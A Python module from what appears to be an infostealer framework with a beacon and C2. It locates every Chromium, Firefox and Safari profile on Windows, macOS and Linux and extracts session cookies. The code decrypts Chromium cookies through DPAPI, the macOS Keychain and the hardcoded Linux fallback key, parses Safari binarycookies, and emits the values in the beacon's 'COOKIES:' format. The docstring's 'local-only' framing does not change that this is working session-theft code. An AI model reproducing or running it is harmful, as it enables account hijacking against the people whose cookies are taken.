"""local_cookies.py — the stealer ENGINE without the beacon.

Reads the OPERATOR's own browsers, on the OPERATOR's own box, and emits the
same `COOKIES:[...]` shape the beacon path emits — no beacon deploy, no
check-in, no C2 round trip, no configuration. Downstream (jar, recon, redact,
reports) cannot tell the two paths apart, which is the point: one contract,
two transports.

Coverage — every family, every platform, every profile:

* **Chromium family** — Chrome, Edge, Brave, Chromium, Vivaldi, Opera,
  Opera GX on Windows, macOS and Linux;
* **Gecko** — Firefox (all channels, plus snap/flatpak/ESR) wherever it is
  installed. Firefox cookies are NOT encrypted, so they are recovered whole;
* **Safari** — `Cookies.binarycookies` on macOS, plaintext too.

A value that is sealed with a key this box cannot reach (a Chromium profile
whose OS keystore is locked, or Chrome >= 127 App-Bound Encryption) is counted
in `diagnostics` and skipped — never reported as a plausible-looking wrong
value, because a silently corrupt session cookie is worse than a missing one.

Safety posture (local-only by construction):

* inputs are files under the user's own home/LOCALAPPDATA; the ONLY imports
  are stdlib + `cryptography` (already a hard dependency). No sockets, no
  subprocess, no HTTP — a network-capable import here is a bug, pinned by
  test;
* browser SQLite files are COPIED to temp first (never locked, never written)
  and the copy is unlinked in a finally;
* values live in memory + the WorldModel finding like every other stealer
  output, under the SAME protections (redact carve-out, stream summaries,
  gitignored session files). Nothing new is invented for storage because
  nothing new is needed.
"""
from __future__ import annotations

import base64
import json
import os
import shutil
import sqlite3
import sys
import tempfile
from typing import Dict, List, Optional, Tuple

# ── where the browsers live ─────────────────────────────────────────────────
# Each entry is (label, path parts). Windows splits roaming/local; the others
# all live under $HOME.

_CHROMIUM_WINDOWS_LOCAL = (
    ("chrome", ("Google", "Chrome", "User Data")),
    ("edge", ("Microsoft", "Edge", "User Data")),
    ("brave", ("BraveSoftware", "Brave-Browser", "User Data")),
    ("chromium", ("Chromium", "User Data")),
    ("vivaldi", ("Vivaldi", "User Data")),
)
_CHROMIUM_WINDOWS_ROAMING = (
    ("opera", ("Opera Software", "Opera Stable")),
    ("opera-gx", ("Opera Software", "Opera GX Stable")),
)
_CHROMIUM_MACOS = (
    ("chrome", ("Google", "Chrome")),
    ("chrome-canary", ("Google", "Chrome Canary")),
    ("edge", ("Microsoft Edge",)),
    ("brave", ("BraveSoftware", "Brave-Browser")),
    ("chromium", ("Chromium",)),
    ("vivaldi", ("Vivaldi",)),
    ("opera", ("Opera Software", "Opera Stable")),
    ("opera-gx", ("Opera Software", "Opera GX Stable")),
)
_CHROMIUM_LINUX = (
    ("chrome", "google-chrome"),
    ("chrome-beta", "google-chrome-beta"),
    ("chrome-unstable", "google-chrome-unstable"),
    ("chromium", "chromium"),
    ("brave", "brave-browser"),
    ("edge", "microsoft-edge"),
    ("vivaldi", "vivaldi"),
    ("opera", "opera"),
    ("opera-gx", "opera-gx"),
)

_STATE_FILE = "Local State"
_CHROMIUM_DB = "Cookies"
_GECKO_DB = "cookies.sqlite"

# Suffix of every Chrome-family database name, so one lookup covers the
# Network/Cookies and the legacy top-level Cookies layouts.
_SAFARI_DB = "Cookies.binarycookies"


def _platform(override: str = "") -> str:
    if override:
        return override
    if os.name == "nt":
        return "windows"
    if sys.platform == "darwin":
        return "macos"
    return "linux"


def _home(override: str = "") -> str:
    if override:
        return override
    return (os.environ.get("HOME", "")
            or os.environ.get("USERPROFILE", "")
            or os.path.expanduser("~"))


# ── decryption ──────────────────────────────────────────────────────────────

def _dpapi_decrypt(blob: bytes) -> bytes:
    """Windows DPAPI user-context decrypt (this user, this box only)."""
    import ctypes
    from ctypes import wintypes

    class _Blob(ctypes.Structure):
        _fields_ = [("cbData", wintypes.DWORD),
                    ("pbData", wintypes.LPBYTE)]

    buf_in = ctypes.create_string_buffer(blob)
    blob_in = _Blob(len(blob), ctypes.cast(buf_in, wintypes.LPBYTE))
    blob_out = _Blob()
    if not ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0,
            ctypes.byref(blob_out)):
        raise OSError("CryptUnprotectData failed")
    try:
        out = ctypes.string_at(blob_out.pbData, blob_out.cbData)
    finally:
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
    return bytes(out)


def _pbkdf2(password: bytes, iterations: int, length: int = 16) -> bytes:
    """Chrome's OSCrypt key schedule: PBKDF2-HMAC-SHA1(salt='saltysalt')."""
    import hashlib
    return hashlib.pbkdf2_hmac("sha1", password, b"saltysalt", iterations, length)


def _macos_keychain_password(service: str) -> bytes:
    """The '<Browser> Safe Storage' password, straight from the Keychain.

    Uses the Security framework through ctypes (no `security` subprocess: this
    module must stay unable to spawn anything).
    """
    import ctypes
    from ctypes import c_char_p, c_int, c_uint32, c_void_p, byref, POINTER

    security = ctypes.cdll.LoadLibrary(
        "/System/Library/Frameworks/Security.framework/Security")
    security.SecKeychainFindGenericPassword.restype = c_int
    security.SecKeychainFindGenericPassword.argtypes = [
        c_void_p, c_uint32, c_char_p, c_uint32, c_char_p,
        POINTER(c_uint32), POINTER(c_void_p), c_void_p]
    length = c_uint32(0)
    data = c_void_p()
    item = c_void_p()
    name = service.encode("utf-8")
    status = security.SecKeychainFindGenericPassword(
        None, c_uint32(len(name)), name, c_uint32(0), None,
        byref(length), byref(data), byref(item))
    if status != 0 or not data.value:
        raise OSError(f"SecKeychainFindGenericPassword failed ({status})")
    try:
        return ctypes.string_at(data.value, length.value)
    finally:
        security.SecKeychainFreeContent.restype = c_int
        security.SecKeychainFreeContent(data, None)


def _master_key(user_data: str, browser: str, platform: str) -> Optional[bytes]:
    """The AES key a Chromium profile sealed its cookies with, or None.

    Windows: the key is DPAPI-wrapped in `Local State`.
    macOS: the key is a Keychain password stretched with PBKDF2 (1003 rounds).
    Linux: with no keyring in reach Chrome itself falls back to the literal
    password "peanuts" (1 round) — that is the case handled here.
    """
    if platform == "windows":
        try:
            with open(os.path.join(user_data, _STATE_FILE), "r",
                      encoding="utf-8") as fh:
                state = json.load(fh)
            raw = base64.b64decode(
                state.get("os_crypt", {}).get("encrypted_key", ""))
        except (OSError, ValueError, KeyError, TypeError):
            return None
        if not raw.startswith(b"DPAPI"):
            return None
        try:
            return _dpapi_decrypt(raw[5:])
        except OSError:
            return None

    if platform == "macos":
        service = {
            "edge": "Microsoft Edge Safe Storage",
            "brave": "Brave Safe Storage",
            "chromium": "Chromium Safe Storage",
            "vivaldi": "Vivaldi Safe Storage",
            "opera": "Opera Safe Storage",
            "opera-gx": "Opera Safe Storage",
            "chrome-canary": "Chrome Safe Storage",
        }.get(browser, "Chrome Safe Storage")
        try:
            return _pbkdf2(_macos_keychain_password(service), 1003)
        except Exception:
            return None

    return _pbkdf2(b"peanuts", 1)


def _decrypt_value(enc: bytes, master: Optional[bytes], platform: str,
                   diagnostics: Optional[Dict[str, int]] = None) -> str:
    """Recover one Chromium `encrypted_value`. "" means "not recoverable"."""
    def _note(reason: str) -> str:
        if diagnostics is not None:
            diagnostics[reason] = diagnostics.get(reason, 0) + 1
        return ""

    if not enc:
        return ""
    prefix = bytes(enc[:3])
    if prefix == b"v20":
        # App-Bound Encryption (Chrome/Edge >= 127): the key is bound to the
        # browser's own service and needs its identity, not the user's. Say so
        # instead of returning garbage.
        return _note("app-bound (v20)")
    if prefix in (b"v10", b"v11"):
        if master is None:
            return _note("os keystore unavailable")
        try:
            if platform == "linux":
                # Linux has no AEAD variant: AES-128-CBC, IV = 16 spaces.
                from cryptography.hazmat.primitives.ciphers import (
                    Cipher, algorithms, modes)
                if len(master) != 16:
                    return _note("unexpected key length")
                decryptor = Cipher(algorithms.AES(master),
                                   modes.CBC(b"\x20" * 16)).decryptor()
                plain = decryptor.update(bytes(enc[3:])) + decryptor.finalize()
                pad = plain[-1] if plain else 0
                if not 1 <= pad <= 16 or plain[-pad:] != bytes([pad]) * pad:
                    return _note("wrong key (padding)")
                plain = plain[:-pad]
            else:
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                nonce, ct = bytes(enc[3:15]), bytes(enc[15:])
                if len(master) != 32:
                    return _note("unexpected key length")
                plain = AESGCM(master).decrypt(nonce, ct, None)
            return plain.decode("utf-8", "replace")
        except Exception:
            return _note("decryption failed")
    if platform != "windows":
        return _note("unknown cipher")
    try:
        return _dpapi_decrypt(bytes(enc)).decode("utf-8", "replace")
    except OSError:
        return _note("dpapi failed")


# ── path discovery ──────────────────────────────────────────────────────────

def _chromium_roots(platform: str, local_root: str,
                    roaming_root: str) -> List[Tuple[str, str]]:
    out: List[Tuple[str, str]] = []
    if platform == "windows":
        for env_root, table in ((local_root, _CHROMIUM_WINDOWS_LOCAL),
                                (roaming_root, _CHROMIUM_WINDOWS_ROAMING)):
            if not env_root:
                continue
            for label, parts in table:
                out.append((label, os.path.join(env_root, *parts)))
    elif platform == "macos":
        support = os.path.join(local_root, "Library", "Application Support")
        for label, parts in _CHROMIUM_MACOS:
            out.append((label, os.path.join(support, *parts)))
    else:
        config = os.path.join(local_root, ".config")
        for label, folder in _CHROMIUM_LINUX:
            out.append((label, os.path.join(config, folder)))
    return out


def _chromium_databases(platform: str, local_root: str, roaming_root: str):
    """(browser, profile, db_path, user_data_dir) for every Chromium profile."""
    for browser, user_data in _chromium_roots(platform, local_root,
                                              roaming_root):
        if not user_data or not os.path.isdir(user_data):
            continue
        profiles = ["Default"]
        try:
            profiles += sorted(
                entry for entry in os.listdir(user_data)
                if entry.startswith("Profile ")
                and os.path.isdir(os.path.join(user_data, entry)))
        except OSError:
            pass
        # Opera keeps the profile files directly in its data dir.
        if os.path.basename(user_data).startswith("Opera"):
            profiles = [""] + profiles[1:]
        for profile in profiles:
            base = os.path.join(user_data, profile) if profile else user_data
            for db in (os.path.join(base, "Network", _CHROMIUM_DB),
                       os.path.join(base, _CHROMIUM_DB)):
                if os.path.isfile(db):
                    yield browser, profile or "Default", db, user_data
                    break


def _gecko_roots(platform: str, local_root: str,
                 roaming_root: str) -> List[str]:
    if platform == "windows":
        return ([os.path.join(roaming_root, "Mozilla", "Firefox", "Profiles")]
                if roaming_root else [])
    if platform == "macos":
        return [os.path.join(local_root, "Library", "Application Support",
                             "Firefox", "Profiles")]
    return [
        os.path.join(local_root, ".mozilla", "firefox"),
        # Ubuntu/Fedora ship Firefox as a snap; Flatpak uses ~/.var
        os.path.join(local_root, "snap", "firefox", "common", ".mozilla",
                     "firefox"),
        os.path.join(local_root, ".var", "app", "org.mozilla.firefox",
                     ".mozilla", "firefox"),
        os.path.join(local_root, ".librewolf"),
        os.path.join(local_root, ".waterfox"),
    ]


def _gecko_databases(platform: str, local_root: str, roaming_root: str):
    for root in _gecko_roots(platform, local_root, roaming_root):
        if not root or not os.path.isdir(root):
            continue
        try:
            entries = sorted(os.listdir(root))
        except OSError:
            continue
        for entry in entries:
            db = os.path.join(root, entry, _GECKO_DB)
            if os.path.isfile(db):
                yield "firefox", entry, db


def _safari_databases(platform: str, local_root: str):
    if platform != "macos":
        return
    for path in (os.path.join(local_root, "Library", "Cookies", _SAFARI_DB),
                 os.path.join(local_root, "Library", "Containers",
                              "com.apple.Safari", "Data", "Library",
                              "Cookies", _SAFARI_DB)):
        if os.path.isfile(path):
            yield "safari", "Default", path


# ── readers ─────────────────────────────────────────────────────────────────

def _snapshot(db_path: str) -> str:
    """Copy the (possibly locked) browser DB to a scratch file."""
    fd, tmp = tempfile.mkstemp(prefix="phantom-cookies-", suffix=".db")
    os.close(fd)
    try:
        shutil.copyfile(db_path, tmp)
    except OSError:
        try:
            os.remove(tmp)
        except OSError:
            pass
        raise
    return tmp


def _sqlite_rows(tmp: str, table: str) -> List[dict]:
    con = sqlite3.connect(f"file:{tmp}?mode=ro", uri=True)
    try:
        cursor = con.execute(f"SELECT * FROM {table}")
        names = [col[0] for col in cursor.description or ()]
        return [dict(zip(names, row)) for row in cursor.fetchall()]
    finally:
        con.close()


def _read_chromium(db_path: str, user_data: str, browser: str, platform: str,
                   diagnostics: Optional[Dict[str, int]]) -> List[dict]:
    """Chromium `cookies`: plaintext `value`, or the sealed `encrypted_value`."""
    out: List[dict] = []
    tmp = _snapshot(db_path)
    try:
        master = _master_key(user_data, browser, platform)
        for row in _sqlite_rows(tmp, "cookies"):
            name = str(row.get("name") or "")
            if not name:
                continue
            value = str(row.get("value") or "")
            if not value:
                enc = row.get("encrypted_value") or b""
                if enc:
                    value = _decrypt_value(bytes(enc), master, platform,
                                           diagnostics)
            if not value:
                continue
            out.append({
                "host": str(row.get("host_key") or "").lower(),
                "name": name,
                "path": str(row.get("path") or "/") or "/",
                "value": value,
            })
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass
    return out


def _read_gecko(db_path: str, diagnostics: Optional[Dict[str, int]]) -> List[dict]:
    """Firefox `moz_cookies`: the values are NOT encrypted."""
    out: List[dict] = []
    tmp = _snapshot(db_path)
    try:
        for row in _sqlite_rows(tmp, "moz_cookies"):
            name = str(row.get("name") or "")
            value = str(row.get("value") or "")
            if not name or not value:
                continue
            out.append({
                "host": str(row.get("host") or "").lower(),
                "name": name,
                "path": str(row.get("path") or "/") or "/",
                "value": value,
            })
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass
    return out


def _parse_binarycookies(data: bytes) -> List[dict]:
    """Safari's `Cookies.binarycookies` (plaintext, no encryption at all)."""
    if len(data) < 16 or data[:7] != b"cookies":
        return []
    if data[7] != 0x00:            # only the big-endian layout is defined
        return []
    pages = int.from_bytes(data[8:12], "big")
    if pages <= 0 or pages > 4096:
        return []
    offset = 12 + pages * 4
    out: List[dict] = []
    for index in range(pages):
        start = 12 + index * 4
        size = int.from_bytes(data[start:start + 4], "big")
        page = data[offset:offset + size]
        # Each page starts with a zero word and holds no more cookies than its
        # offset table can address.
        if len(page) < 8:
            continue
        count = int.from_bytes(page[4:8], "little")
        if count <= 0 or 8 + count * 4 > len(page):
            continue
        for cookie_index in range(count):
            cell = 8 + cookie_index * 4
            record = int.from_bytes(page[cell:cell + 4], "little")
            out.extend(_parse_binarycookie_record(page, record))
        offset += size
    return out


def _parse_binarycookie_record(page: bytes, record: int) -> List[dict]:
    if record <= 0 or record + 56 > len(page):
        return []
    size = int.from_bytes(page[record:record + 4], "little")
    if size <= 0 or record + size > len(page):
        return []
    raw = page[record:record + size]

    def u32(at: int) -> int:
        return int.from_bytes(raw[at:at + 4], "little")

    def text(at: int) -> str:
        if at <= 0 or at >= len(raw):
            return ""
        end = raw.find(b"\x00", at)
        if end < 0:
            end = len(raw)
        return raw[at:end].decode("utf-8", "replace")

    name = text(u32(20))
    if not name:
        return []
    path = text(u32(24)) or "/"
    return [{
        "host": _host_of(text(u32(16))),
        "name": name,
        "path": path,
        "value": text(u32(28)),
    }]


def _host_of(url: str) -> str:
    """Safari stores the full URL; the cookie host is its authority."""
    value = url.strip().lower()
    if "://" in value:
        value = value.split("://", 1)[1]
    return value.split("/", 1)[0].split(":", 1)[0]


def read_browser_cookies(base_dir: str = "",
                         domains: Optional[List[str]] = None,
                         max_cookies: int = 500,
                         platform: str = "",
                         home: str = "",
                         diagnostics: Optional[Dict[str, int]] = None
                         ) -> List[dict]:
    """Read session cookies from EVERY browser this box carries.

    Returns beacon-compatible entries
    ``[{host,name,path,value,browser,profile}]`` (values truncated like the
    beacon path). A missing browser, a locked file or an unreadable profile
    yields fewer entries, never an exception. `domains` optionally restricts
    to suffixes (``["instagram.com"]``); empty = everything.

    `base_dir` overrides the platform root (Windows: %LOCALAPPDATA%; used by
    the tests and by an operator whose profile lives elsewhere). `platform`
    and `home` override the detection, so the same code path can be audited
    for another OS.
    """
    os_key = _platform(platform)
    if base_dir:
        # A caller-supplied root means "this is where the browsers live".
        local_root = roaming_root = base_dir
    elif os_key == "windows":
        local_root = os.environ.get("LOCALAPPDATA", "")
        roaming_root = os.environ.get("APPDATA", "")
    else:
        local_root = roaming_root = home or _home()
    wanted = [d.lower().lstrip(".") for d in (domains or []) if d]
    out: List[dict] = []

    def _keep(host: str) -> bool:
        if not host:
            return False
        if not wanted:
            return True
        return any(host == w or host.endswith("." + w) for w in wanted)

    def _collect(browser: str, profile: str, entries: List[dict]) -> int:
        added = 0
        for entry in entries:
            host = str(entry.get("host") or "").lower()
            if not _keep(host):
                continue
            out.append({"host": host,
                        "name": str(entry.get("name") or ""),
                        "path": str(entry.get("path") or "/") or "/",
                        "value": str(entry.get("value") or "")[:400],
                        "browser": browser,
                        "profile": profile})
            added += 1
            if len(out) >= max_cookies:
                break
        return added

    for browser, profile, db, user_data in _chromium_databases(
            os_key, local_root, roaming_root):
        try:
            _collect(browser, profile,
                     _read_chromium(db, user_data, browser, os_key,
                                    diagnostics))
        except (OSError, sqlite3.Error, ValueError):
            continue
        if len(out) >= max_cookies:
            return out

    for browser, profile, db in _gecko_databases(os_key, local_root,
                                                 roaming_root):
        try:
            _collect(browser, profile, _read_gecko(db, diagnostics))
        except (OSError, sqlite3.Error, ValueError):
            continue
        if len(out) >= max_cookies:
            return out

    for browser, profile, db in _safari_databases(os_key, local_root):
        try:
            with open(db, "rb") as fh:
                _collect(browser, profile, _parse_binarycookies(fh.read()))
        except (OSError, ValueError):
            continue
        if len(out) >= max_cookies:
            return out

    return out


def collect_local_session(domains=None) -> tuple:
    """One-shot local collection -> (ok, COOKIES: marker lines), the same
    wire shape the beacon path emits, so the SAME interpreter turns it
    into the SAME findings. Empty box/browser -> (False, [reason])."""
    diagnostics: Dict[str, int] = {}
    try:
        entries = read_browser_cookies(
            domains=list(domains or []) if domains else None,
            diagnostics=diagnostics)
    except Exception as exc:
        return False, [f"ERROR: local cookie read failed: {exc}"]
    if not entries:
        reason = "no local browser cookies found"
        if diagnostics:
            sealed = ", ".join(f"{count}x {why}"
                               for why, count in sorted(diagnostics.items()))
            reason += f" (skipped sealed values: {sealed})"
        return False, [f"ERROR: {reason}"]
    lines = ["COOKIES:" + json.dumps(
        [{k: v for k, v in entry.items()
          if k in ("host", "name", "path", "value")} for entry in entries[:50]])]
    return True, lines


__all__ = ["read_browser_cookies", "collect_local_session"]
